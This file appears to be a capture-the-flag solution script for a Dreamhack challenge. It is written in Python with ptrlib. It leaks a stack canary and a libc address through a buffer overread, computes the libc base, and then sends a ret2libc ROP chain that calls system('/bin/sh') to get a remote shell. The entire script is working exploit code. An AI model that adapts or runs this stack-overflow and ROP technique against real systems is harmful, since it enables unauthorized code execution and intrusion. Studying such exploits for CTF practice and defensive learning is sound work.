from ptrlib import *

elf = ELF("./prob")
# libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
libc = ELF(
    "./docker_libc.so.6"
)  # ubuntu:22.04@sha256:b6b83d3c331794420340093eb706a6f152d9c1fa51b262d9bf34594887c2c7ac


# sock = Process("./prob")
sock = Socket("host3.dreamhack.games", 21337)
# sock.debug = True

# canary & libc leak
sock.sendlineafter("> ", "2.")
sock.sendlineafter("Write: .\n", "A" * 0xFF)
sock.sendlineafter("> ", "1.")
sock.recvuntil("A" * 0xFF)
sock.recv(8)
canary = u64(sock.recv(8))
logger.info("canary: " + hex(canary))
for i in range(23):
    sock.recv(8)
libc.base = u64(sock.recv(8)) - libc.symbol("__libc_start_main") - 0x80

# rop
payload = b"B" * 0x17
payload += p64(canary)
payload += p64(0)
payload += p64(next(libc.gadget("pop rdi; ret;")))
payload += p64(next(libc.search("/bin/sh")))
payload += p64(next(libc.gadget("ret;")))
payload += p64(libc.symbol("system"))
payload += b"."
sock.sendlineafter("> ", payload)

sock.sh()
